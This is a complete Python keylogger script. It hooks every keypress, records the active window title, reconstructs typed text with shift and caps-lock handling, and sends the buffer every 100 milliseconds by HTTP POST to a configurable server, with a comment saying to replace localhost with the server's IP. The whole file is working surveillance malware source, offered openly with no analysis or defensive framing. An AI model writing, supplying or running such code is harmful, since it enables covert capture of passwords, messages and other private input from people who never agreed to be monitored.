import keyboard  # Library to capture keyboard events
import requests  # Library to send HTTP requests
import pygetwindow as gw  # Library to get information about application windows
import time  # Library for time manipulation
import threading  # Library to create and manage threads

# Flask server URL where the data will be sent
SERVER_URL = "http://127.0.0.1:5000/log"  # Replace with the server's IP
# Global variables to store key states and window information
key_buffer = []  # List to store pressed keys
last_window = None  # Stores the title of the last active window
ctrl_active = False  # Flag to indicate if the CTRL key is pressed
alt_active = False  # Flag to indicate if the ALT key is pressed
shift_active = False  # Flag to indicate if the SHIFT key is pressed
caps_lock_active = False  # Flag to indicate if CAPS LOCK is active
ctrl_already_used = False  # Flag to control the first letter after CTRL
buffer_lock = threading.Lock()  # Lock to synchronize access to the key buffer

def get_active_window():
    """Returns the name of the active window."""
    try:
        window = gw.getActiveWindow()  # Gets the active window
        return window.title if window else "Unknown"  # Returns the window title or "Unknown" if no active window
    except Exception as e:
        print(f"Error getting active window: {e}")
        return "Error getting window"  # Returns an error message if an exception occurs

def send_keys():
    """Sends the key buffer to the server without unnecessary blocking."""
    global key_buffer, last_window

    if not key_buffer:  # Checks if the buffer is empty
        return

    text = "".join(key_buffer)  # Joins the keys in the buffer into a single string
    key_buffer.clear()  # Clears the buffer after sending

    try:
        # Sends the data to the server using a POST request
        response = requests.post(SERVER_URL, json={"key": text, "window": last_window})
        response.raise_for_status()  # Checks if the request was successful
        print(f"Data sent: {text}")
    except Exception as e:
        print(f"Error sending data: {e}")  # Prints an error message if an exception occurs

def on_press(event):
    """Captures pressed keys and avoids CTRL and ALT shortcuts."""
    global last_window, ctrl_active, alt_active, shift_active, caps_lock_active, ctrl_already_used

    key = event.name.lower()  # Gets the name of the pressed key in lowercase
    print(f"Key pressed: {key}")

    # Updates the state of modifier keys (CTRL, ALT, SHIFT, CAPS LOCK)
    if key in ["ctrl", "left ctrl", "right ctrl"]:
        ctrl_active = True
        ctrl_already_used = False  # Resets the flag when CTRL is pressed
    elif key in ["alt", "left alt", "right alt"]:
        alt_active = True
    elif key in ["shift", "left shift", "right shift"]:
        shift_active = True
    elif key == "caps lock":
        caps_lock_active = not caps_lock_active  # Toggles the CAPS LOCK state

    # Updates the active window if it has changed
    current_window = get_active_window()
    if current_window != last_window:
        last_window = current_window
        with buffer_lock:
            key_buffer.append(f"\n\n[Opening {current_window}]\n")  # Adds a marker indicating the window change

    # Ignores printing of modifier keys and TAB
    if key in ["shift", "caps lock", "ctrl", "left ctrl", "right ctrl", "alt", "left alt", "right alt", "tab"]:
        return

    # Character handling
    if len(key) == 1:  # If it's a letter or number
        # If the key is a letter and CTRL is active, marks it as a possible shortcut
        if key.isalpha() and ctrl_active and not ctrl_already_used:
            key = f" {key.upper()} (possible shortcut with CTRL or ALT) "
            ctrl_already_used = True
        # If the key is a letter, applies uppercase if SHIFT or CAPS LOCK is active
        elif key.isalpha():
            if shift_active or caps_lock_active:
                key = key.upper()  # Converts to uppercase
            else:
                key = key.lower()  # Converts to lowercase
    elif key == "space":
        key = " "
    elif key == "enter":
        key = "\n"
    elif key == "backspace":
        # Checks if the buffer is not empty and adds the backspace character
        with buffer_lock:
            if key_buffer:
                key_buffer.append("\b")  # Adds backspace to the buffer
                print("Backspace pressed, removing the last character from the buffer.")
        return  # Does not add "backspace" to the buffer

    # Adds the key to the buffer
    with buffer_lock:
        key_buffer.append(key)

def on_release(event):
    """Detects when CTRL or ALT are released to resume normal key registration."""
    global ctrl_active, alt_active, shift_active

    key = event.name.lower()
    print(f"Key released: {key}")

    # Updates the state of modifier keys when they are released
    if key in ["ctrl", "left ctrl", "right ctrl"]:
        ctrl_active = False
    elif key in ["alt", "left alt", "right alt"]:
        alt_active = False
    elif key == "shift" or key == "left shift" or key == "right shift":
        shift_active = False

def monitor_keys():
    """Monitors pressed keys without significant delay."""
    print("Monitoring keys...")  # Displays a message indicating that keys are being monitored
    while True:
        # Sends captured keys every 100ms (adjustable as needed)
        if key_buffer:
            send_keys()
        time.sleep(0.1)  # Waits 100ms before checking and sending keys again

# Starts capturing pressed and released keys
keyboard.on_press(on_press)
keyboard.on_release(on_release)

# Starts monitoring in a separate thread for better responsiveness
monitor_thread = threading.Thread(target=monitor_keys, daemon=True)
monitor_thread.start()

print("Monitoring keys... Press 'ESC' to exit.")
keyboard.wait("esc")  # The script stops when 'esc' is pressed